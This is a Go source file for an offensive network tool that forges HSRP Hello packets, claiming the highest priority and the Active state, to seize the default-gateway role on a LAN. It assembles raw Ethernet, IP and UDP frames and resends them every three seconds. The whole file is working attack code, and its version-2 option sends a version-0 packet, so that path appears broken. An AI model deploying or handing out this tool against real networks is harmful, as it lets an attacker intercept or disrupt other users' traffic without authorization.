package hsrp

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"time"
)

const (
	hsrpTag       = "\x1b[38;5;208m[HSRP]\x1b[0m"
	hsrpV2Tag     = "\x1b[38;5;208m[HSRPv2]\x1b[0m"
	sendInterval  = 3 * time.Second
	hsrpPort      = 1985
	hsrpV1Mcast   = "224.0.0.2"
	hsrpV2Mcast   = "224.0.0.102"
)

type rawSocket interface {
	Send(frame []byte) error
	Close() error
}

// Hijacker injects forged HSRP Hello packets to seize the active role.
type Hijacker struct {
	Interface string
	Group     int
	SourceIP  string
	VirtualIP string
	Auth      string
	V2        bool
}

func (h *Hijacker) Run() error {
	iface, err := net.InterfaceByName(h.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", h.Interface, err)
	}
	src := net.ParseIP(h.SourceIP)
	if src == nil || src.To4() == nil {
		return fmt.Errorf("invalid --src %q", h.SourceIP)
	}
	vip := net.ParseIP(h.VirtualIP)
	if vip == nil || vip.To4() == nil {
		return fmt.Errorf("invalid --virtual-ip %q", h.VirtualIP)
	}
	if h.Group < 0 || h.Group > 255 {
		return fmt.Errorf("invalid --group %d (must be 0-255)", h.Group)
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	srcMAC := iface.HardwareAddr
	if len(srcMAC) != 6 {
		return fmt.Errorf("interface %s has no MAC address", h.Interface)
	}

	mcast := hsrpV1Mcast
	tag := hsrpTag
	if h.V2 {
		mcast = hsrpV2Mcast
		tag = hsrpV2Tag
		fmt.Printf("%s We begin to intercept the role of the ACTIVE router...\n", tag)
	} else {
		fmt.Printf("%s Start of HSRP injection. Interception of the active router role...\n", tag)
	}
	fmt.Printf("%s Press Ctrl+C to stop.\n", tag)

	payload := buildHSRPHello(byte(h.Group), vip.To4(), h.Auth)
	frame := buildHSRPFrame(srcMAC, src.To4(), net.ParseIP(mcast).To4(), payload)

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped.\n", tag)
		os.Exit(0)
	}()

	ticker := time.NewTicker(sendInterval)
	defer ticker.Stop()

	if err := sock.Send(frame); err != nil {
		return fmt.Errorf("send: %w", err)
	}
	for range ticker.C {
		if err := sock.Send(frame); err != nil {
			return fmt.Errorf("send: %w", err)
		}
	}
	return nil
}

func buildHSRPHello(group byte, vip net.IP, auth string) []byte {
	pkt := make([]byte, 20)
	pkt[0] = 0x00 // version
	pkt[1] = 0x00 // Hello
	pkt[2] = 16   // Active
	pkt[3] = 3    // hello time
	pkt[4] = 10   // hold time
	pkt[5] = 255  // priority
	pkt[6] = group
	copy(pkt[8:16], padAuth(auth))
	copy(pkt[16:20], vip.To4())
	return pkt
}

func padAuth(s string) []byte {
	b := make([]byte, 8)
	copy(b, []byte(s))
	return b
}

func buildHSRPFrame(srcMAC net.HardwareAddr, srcIP, dstIP net.IP, hsrpPayload []byte) []byte {
	udpLen := 8 + len(hsrpPayload)
	ipLen := 20 + udpLen
	frame := make([]byte, 14+ipLen)

	dstMAC := ipv4MulticastMAC(dstIP)
	copy(frame[0:6], dstMAC[:])
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], 0x0800)

	frame[14] = 0x45
	binary.BigEndian.PutUint16(frame[16:18], uint16(ipLen))
	frame[18] = 1
	frame[19] = 17
	copy(frame[22:26], srcIP.To4())
	copy(frame[26:30], dstIP.To4())

	udpOff := 34
	binary.BigEndian.PutUint16(frame[udpOff:udpOff+2], hsrpPort)
	binary.BigEndian.PutUint16(frame[udpOff+2:udpOff+4], hsrpPort)
	binary.BigEndian.PutUint16(frame[udpOff+4:udpOff+6], uint16(udpLen))
	copy(frame[udpOff+8:], hsrpPayload)

	binary.BigEndian.PutUint16(frame[20:22], ipChecksum(frame[14:14+ipLen]))
	return frame
}

func ipv4MulticastMAC(ip net.IP) [6]byte {
	v4 := ip.To4()
	return [6]byte{0x01, 0x00, 0x5E, v4[1] & 0x7F, v4[2], v4[3]}
}

func ipChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(data); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}
